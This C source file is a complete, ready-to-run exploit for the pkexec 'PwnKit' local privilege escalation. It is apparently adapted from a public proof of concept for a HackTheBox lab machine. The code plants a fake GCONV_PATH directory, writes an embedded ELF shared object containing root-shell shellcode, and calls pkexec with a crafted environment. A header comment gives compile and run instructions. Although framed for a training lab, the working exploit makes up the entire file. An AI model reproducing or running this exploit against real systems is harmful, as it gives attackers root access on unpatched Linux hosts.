#include <sys/stat.h>
#include <stddef.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h> 

/*
README
Modified Version of Clubby789 poc.c code to run with HTB PwnKit Machine
References: https://saarsec.rocks/2020/05/14/golf.so.html



How to use: 
Compile code locally with --static to avoid glib verison errors.

Run:
        gcc PwnKit.c -o PwnKit --static
        chmod +x PwnKit
        ./PwnKit
*/


// Define the contents of the evil shared object file and module

const char evil_so[] = "\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x28\x80\x04\x08\x00\x00\x00\x00\x3f\x00\x00\x00\x00\x00\x00\x00\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\xeb\x06\x40\x00\x38\x00\x02\x00\x48\xf7\xdb\xeb\x18\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x00\x00\x00\x31\xc0\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x69\xeb\x5a\x00\x00\xd4\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x06\x00\x00\x00\x8f\x00\x00\x00\x00\x00\x00\x00\x8f\x80\x04\x08\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x28\x80\x04\x08\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x57\x48\x31\xff\x0f\x05\xb8\x6a\x00\x00\x00\x0f\x05\x5f\xb8\x3b\x00\x00\x00\x0f\x05";
const char evil_mod[] = "module INTERNAL evil// evil 2\n";

char *envp[] = {
    "evildir",
    "PATH=GCONV_PATH=.",
    "CHARSET=evil",
    "SHELL=evil",
    NULL
};

// Function to handle errors and exit
void handle_error(const char *message) {
    perror(message); // Print error message with explanation
    exit(EXIT_FAILURE); // Exit the program with a failure status
}

int main() {
    int fd;
    // Create a temporary directory for execution
  
    char template[] = "pkexecXXXXXX";
    char *dir = mkdtemp(template);
    if (dir == NULL)
        handle_error("mkdtemp"); // Handle error if mkdtemp fails
    
    // Change directory to the temporary directory
    if (chdir(dir) == -1)
        handle_error("chdir"); // Handle error if chdir fails

    // Create a fake GCONV_PATH directory
    if (mkdir("GCONV_PATH=.", 0755) == -1)
        handle_error("mkdir"); // Handle error if mkdir fails

    // Create a file inside GCONV_PATH directory
    fd = open("GCONV_PATH=./evildir", O_WRONLY | O_CREAT, 0755);
    if (fd == -1)
        handle_error("open"); // Handle error if open fails
    close(fd);

    // Create a directory for evil shared object and module
    if (mkdir("evildir", 0755) == -1)
        handle_error("mkdir"); // Handle error if mkdir fails

    // Write the evil module to gconv-modules file
    fd = open("evildir/gconv-modules", O_WRONLY | O_CREAT, 0755);
    if (fd == -1)
        handle_error("open"); // Handle error if open fails
    if (write(fd, evil_mod, sizeof(evil_mod)) == -1)
        handle_error("write"); // Handle error if write fails
    close(fd);

    // Write the evil shared object to the evildir directory
    fd = open("evildir/evil.so", O_WRONLY | O_CREAT, 0755);
    if (fd == -1)
        handle_error("open"); // Handle error if open fails
    if (write(fd, evil_so, sizeof(evil_so)) == -1)
        handle_error("write"); // Handle error if write fails
    close(fd);

    // Set up environment variables
    char* argv[] = {NULL}; // No arguments for execve
    execve("/usr/bin/pkexec", argv, envp); // Execute pkexec with given arguments and environment
    
    // execve() only returns if an error occurs
    handle_error("execve"); // Handle error if execve fails
}
